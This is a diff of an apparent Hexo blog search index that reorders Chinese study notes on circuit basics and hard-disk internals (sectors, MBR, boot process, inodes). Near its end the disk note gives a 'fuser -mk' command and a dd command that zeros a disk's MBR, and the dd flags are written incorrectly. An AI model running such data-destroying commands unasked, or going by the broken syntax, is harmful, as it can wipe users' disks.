+<p><span class="math inline">\(P_a\)</span>是吸收功率 <span class="math inline">\(P_d\)</span>是发出功率 <span class="math inline">\(U_S\)</span>是电压源,Voltage Source <span class="math inline">\(I_S\)</span>是电流源,current Intensity Source <span class="math inline">\(R_{EQ}\)</span>是等效电阻</p>
+]]></content>
+      <categories>
+        <category>电子电路</category>
+      </categories>
+  </entry>
+  <entry>
     <title>电子电路基础</title>
     <url>/%E7%94%B5%E5%AD%90%E7%94%B5%E8%B7%AF%E5%9F%BA%E7%A1%80/</url>
     <content><![CDATA[<h4 id="电功率">电功率</h4>
@@ -4200,70 +4220,6 @@ U=\frac{p}{I}
 ]]></content>
       <categories>
         <category>电子电路</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>电子电路符号</title>
-    <url>/%E7%94%B5%E5%AD%90%E7%94%B5%E8%B7%AF%E7%AC%A6%E5%8F%B7/</url>
-    <content><![CDATA[<h2 id="重要结论">重要结论:</h2>
-<h4 id="零值电阻从电气特性上来说是等效于零值电压源的.">零值电阻从电气特性上来说,是等效于零值电压源的.</h4>
-<h4 id="独立电压源的电流是由外电路决定的.">独立电压源的电流是由外电路决定的.</h4>
-<h4 id="开路或无穷值电阻从电气特性上等效为零值电流源.">开路或无穷值电阻从电气特性上等效为零值电流源.</h4>
-<p>2b法是指根据两个b(branch支路)求解出b个电流和b个电压</p>
-<p><span class="math inline">\(P_a\)</span>是吸收功率 <span class="math inline">\(P_d\)</span>是发出功率 <span class="math inline">\(U_S\)</span>是电压源,Voltage Source <span class="math inline">\(I_S\)</span>是电流源,current Intensity Source <span class="math inline">\(R_{EQ}\)</span>是等效电阻</p>
-]]></content>
-      <categories>
-        <category>电子电路</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>硬盘相关知识</title>
-    <url>/%E7%A1%AC%E7%9B%98%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/</url>
-    <content><![CDATA[<h3 id="硬盘">硬盘</h3>
-<h4 id="机械式硬盘">机械式硬盘</h4>
-<p>由磁片,磁头构成,磁盘按扇区划分 机械式磁盘可以由多个磁盘片构成 每个磁盘片相同位置的扇区,每个大小512Byte构成的一个空心圆柱叫做柱面 为了实现快速数据读写,硬盘往往会多个磁头向多个磁盘片同时写入数据 同一个文件,会被写到多个磁盘片内</p>
-<h4 id="低级格式化">低级格式化</h4>
-<p>划分磁道,扇区</p>
-<h4 id="磁道">磁道</h4>
-<p>磁头在磁盘掠过的每个圆环叫一个磁道,每个磁道可以分成若干个扇区.</p>
-<h4 id="扇区">扇区</h4>
-<p>扇区,每个大小为512Byte,历史中的每个扇区的大小为512Byte,但是随着技术发展,大家约定俗成的扇区大小变成了4096Byte,但是为了兼容以前的操作系统,磁盘允许每个4096Byte扇区虚拟为八个512Byte,如果所有数据都是从4096Byte扇区的头512Byte开始写入,而不是从后3584Byte中开始写入,这叫做4K对齐 如果从后7个虚拟扇区开始写入,就叫做4K不对齐 4K对齐的好处很多,比如数据写入速度变快,因为扇区的大小越大,所形成的扇区数就明显变少,超过扇区大小的数据存储在多个块中时,所需要操作系统寻找的扇区变少,数据能更快的存储 如果仍然使用512为一块/簇,会造成写入速度极慢</p>
-<h4 id="柱面">柱面</h4>
-<p>每个硬盘都会有许多块磁片,可以同时写入,加快写入效率,缺点就是,一但有一片瓷片损坏,整个硬盘数据都会发生损坏,整个柱面都是不可用的</p>
-<h4 id="块block">块/block</h4>
-<p>windows中,存储数据以簇为单位,linux中,以块为单位(只是叫法不同,但是实际含义都是一个意思),系统中常常规定多少个扇区为一个簇(块),因为一个扇区的大小为512b,所以簇(块)必须为扇区的整数倍,常见的簇(块)大小为1024b,2048b,4096b(4k最常用) 每个块/簇由2^n倍的扇区构成</p>
-<h4 id="主引导记录mbr">主引导记录mbr</h4>
-<p>零磁道,零扇区 512Byte,叫做主引导记录 这个存储空间被划分为三个片段 446Byte:bootloader 启动器,一段代码程序,用于从分区中加载内核(kernel) 64Byte: 16Byte: 用于标识一个分区 最高四个分区,16Byte*4 2Byte: 魔数 标记mbr是否有效</p>
-<h4 id="电脑的启动过程">电脑的启动过程</h4>
-<p>主板加电,bios程序读入内存,cpu执行bios程序,bios自检程序完成后,加载用户定义的启动顺序 开始寻找磁盘上的mbr,当找到有效的mbr后,bios把mbr存储的bootloader加载入内存,bios程序退出,bootloader开始执行 找到预定的特定分区,寻找操作系统的内核,加载入内存,完成内核的解压缩,运行在内存上,bootloader退出,内核开始工作 内核被加载入特权级0的区域</p>
-<p><a href="http://huaqianlee.github.io/2015/08/21/Linux/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Linux%E5%90%AF%E5%8A%A8%E8%BF%87%E7%A8%8B/">深入理解Linux启动过程</a> <a href="http://c.biancheng.net/view/1016.html">Linux内核的加载过程</a> <a href="https://blog.51cto.com/linuxzj/1409882">initrd 和 initramfs</a></p>
-<h4 id="扩展分区">扩展分区</h4>
-<p>存储于硬盘mbr,存储一个指针指向另一个地址,用于绑定扩展分区</p>
-<h4 id="分区">分区</h4>
-<p>一个硬盘被分成若干个逻辑块,用标号进行标识分区,例如sdX</p>
-<h4 id="高级格式化">高级格式化</h4>
-<p>用于创建文件系统,mk2fs</p>
-<h4 id="文件系统">文件系统</h4>
-<p>也是程序的一种,他负责文件的增删改查 文件系统分为几个部分,磁盘引导,超级块,inode池,数据存储区</p>
-<h4 id="inode">inode</h4>
-<p>inode用于记录文件的一些属性,包括修改时间,创建时间,文件数据块的位置,硬链接数,权限,UID,GID等,但不记录文件名,文件名由文件夹记录 详细请下载linuxkernel 在include/linux struct inode结构体中有详细声明</p>
-<h4 id="inode-table">inode table</h4>
-<p>文件系统中专门分出用于存储inode文件的地方,inode文件每个大小一般为128Byte或256Byte,inode数量在创建文件系统时给出,按照一定比例生成inode,比如两个块一个inode</p>
-<h4 id="位图bitmap">位图/Bitmap</h4>
-<p>使用1/0来记录块是否被使用,使用inode的原因是,便于操作系统识别未使用过的系统资源,方便检索 block bitmap:记录块的使用情况 inode bitmap:记录inode的使用情况</p>
-<h4 id="超级块super-block">超级块/Super Block</h4>
-<p>开头的第一个byte是byte 0，从 byte 1024开始往后的一部分数据。超级块中的数据其实就是文件卷的控制信息部分，也可以说它是卷资源表，有关文件卷的大部分信息都保存在这里。例如：硬盘分区中每个block的大小、硬盘分区上一共有多少个block group、以及每个block group中有多少个inode.超级块存在备份,创建文件系统的时候被随机备份于若干块中,若分区superblock被破坏,可以使用备份块恢复</p>
-<h4 id="vfs">vfs</h4>
-<p>不同文件系统的协调器,给出了一个统一接口</p>
-<h4 id="分区命令">分区命令</h4>
-<p>fdisk 指定硬盘 m为操作方法</p>
-<h4 id="安全卸载硬盘">安全卸载硬盘</h4>
-<p>要先杀死所有在分区上运行着的程序 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fuser -mk 挂载点</span><br></pre></td></tr></table></figure></p>
-<h4 id="重新分区">重新分区</h4>
-<p>需要先把硬盘第一个分区(MBR)的所有信息清除 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dd -<span class="keyword">if</span> /dev/zero -of 硬盘设备文件 bs=512 count=1</span><br></pre></td></tr></table></figure></p>
-]]></content>
-      <categories>
-        <category>硬件</category>
       </categories>
   </entry>
   <entry>
@@ -4513,6 +4469,56 @@ A\overrightarrow{x}=\overrightarrow{v}
 ]]></content>
       <categories>
         <category>数学</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>硬盘相关知识</title>
+    <url>/%E7%A1%AC%E7%9B%98%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/</url>
+    <content><![CDATA[<h3 id="硬盘">硬盘</h3>
+<h4 id="机械式硬盘">机械式硬盘</h4>
+<p>由磁片,磁头构成,磁盘按扇区划分 机械式磁盘可以由多个磁盘片构成 每个磁盘片相同位置的扇区,每个大小512Byte构成的一个空心圆柱叫做柱面 为了实现快速数据读写,硬盘往往会多个磁头向多个磁盘片同时写入数据 同一个文件,会被写到多个磁盘片内</p>
+<h4 id="低级格式化">低级格式化</h4>
+<p>划分磁道,扇区</p>
+<h4 id="磁道">磁道</h4>
+<p>磁头在磁盘掠过的每个圆环叫一个磁道,每个磁道可以分成若干个扇区.</p>
+<h4 id="扇区">扇区</h4>
+<p>扇区,每个大小为512Byte,历史中的每个扇区的大小为512Byte,但是随着技术发展,大家约定俗成的扇区大小变成了4096Byte,但是为了兼容以前的操作系统,磁盘允许每个4096Byte扇区虚拟为八个512Byte,如果所有数据都是从4096Byte扇区的头512Byte开始写入,而不是从后3584Byte中开始写入,这叫做4K对齐 如果从后7个虚拟扇区开始写入,就叫做4K不对齐 4K对齐的好处很多,比如数据写入速度变快,因为扇区的大小越大,所形成的扇区数就明显变少,超过扇区大小的数据存储在多个块中时,所需要操作系统寻找的扇区变少,数据能更快的存储 如果仍然使用512为一块/簇,会造成写入速度极慢</p>
+<h4 id="柱面">柱面</h4>
+<p>每个硬盘都会有许多块磁片,可以同时写入,加快写入效率,缺点就是,一但有一片瓷片损坏,整个硬盘数据都会发生损坏,整个柱面都是不可用的</p>
+<h4 id="块block">块/block</h4>
+<p>windows中,存储数据以簇为单位,linux中,以块为单位(只是叫法不同,但是实际含义都是一个意思),系统中常常规定多少个扇区为一个簇(块),因为一个扇区的大小为512b,所以簇(块)必须为扇区的整数倍,常见的簇(块)大小为1024b,2048b,4096b(4k最常用) 每个块/簇由2^n倍的扇区构成</p>
+<h4 id="主引导记录mbr">主引导记录mbr</h4>
+<p>零磁道,零扇区 512Byte,叫做主引导记录 这个存储空间被划分为三个片段 446Byte:bootloader 启动器,一段代码程序,用于从分区中加载内核(kernel) 64Byte: 16Byte: 用于标识一个分区 最高四个分区,16Byte*4 2Byte: 魔数 标记mbr是否有效</p>
+<h4 id="电脑的启动过程">电脑的启动过程</h4>
+<p>主板加电,bios程序读入内存,cpu执行bios程序,bios自检程序完成后,加载用户定义的启动顺序 开始寻找磁盘上的mbr,当找到有效的mbr后,bios把mbr存储的bootloader加载入内存,bios程序退出,bootloader开始执行 找到预定的特定分区,寻找操作系统的内核,加载入内存,完成内核的解压缩,运行在内存上,bootloader退出,内核开始工作 内核被加载入特权级0的区域</p>
+<p><a href="http://huaqianlee.github.io/2015/08/21/Linux/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Linux%E5%90%AF%E5%8A%A8%E8%BF%87%E7%A8%8B/">深入理解Linux启动过程</a> <a href="http://c.biancheng.net/view/1016.html">Linux内核的加载过程</a> <a href="https://blog.51cto.com/linuxzj/1409882">initrd 和 initramfs</a></p>
+<h4 id="扩展分区">扩展分区</h4>
+<p>存储于硬盘mbr,存储一个指针指向另一个地址,用于绑定扩展分区</p>
+<h4 id="分区">分区</h4>
+<p>一个硬盘被分成若干个逻辑块,用标号进行标识分区,例如sdX</p>
+<h4 id="高级格式化">高级格式化</h4>
+<p>用于创建文件系统,mk2fs</p>
+<h4 id="文件系统">文件系统</h4>
+<p>也是程序的一种,他负责文件的增删改查 文件系统分为几个部分,磁盘引导,超级块,inode池,数据存储区</p>
+<h4 id="inode">inode</h4>
+<p>inode用于记录文件的一些属性,包括修改时间,创建时间,文件数据块的位置,硬链接数,权限,UID,GID等,但不记录文件名,文件名由文件夹记录 详细请下载linuxkernel 在include/linux struct inode结构体中有详细声明</p>
+<h4 id="inode-table">inode table</h4>
+<p>文件系统中专门分出用于存储inode文件的地方,inode文件每个大小一般为128Byte或256Byte,inode数量在创建文件系统时给出,按照一定比例生成inode,比如两个块一个inode</p>
+<h4 id="位图bitmap">位图/Bitmap</h4>
+<p>使用1/0来记录块是否被使用,使用inode的原因是,便于操作系统识别未使用过的系统资源,方便检索 block bitmap:记录块的使用情况 inode bitmap:记录inode的使用情况</p>
+<h4 id="超级块super-block">超级块/Super Block</h4>
+<p>开头的第一个byte是byte 0，从 byte 1024开始往后的一部分数据。超级块中的数据其实就是文件卷的控制信息部分，也可以说它是卷资源表，有关文件卷的大部分信息都保存在这里。例如：硬盘分区中每个block的大小、硬盘分区上一共有多少个block group、以及每个block group中有多少个inode.超级块存在备份,创建文件系统的时候被随机备份于若干块中,若分区superblock被破坏,可以使用备份块恢复</p>
+<h4 id="vfs">vfs</h4>
+<p>不同文件系统的协调器,给出了一个统一接口</p>
+<h4 id="分区命令">分区命令</h4>
+<p>fdisk 指定硬盘 m为操作方法</p>
+<h4 id="安全卸载硬盘">安全卸载硬盘</h4>
+<p>要先杀死所有在分区上运行着的程序 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fuser -mk 挂载点</span><br></pre></td></tr></table></figure></p>
+<h4 id="重新分区">重新分区</h4>
+<p>需要先把硬盘第一个分区(MBR)的所有信息清除 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dd -<span class="keyword">if</span> /dev/zero -of 硬盘设备文件 bs=512 count=1</span><br></pre></td></tr></table></figure></p>
+]]></content>
+      <categories>
+        <category>硬件</category>
       </categories>
   </entry>
   <entry>
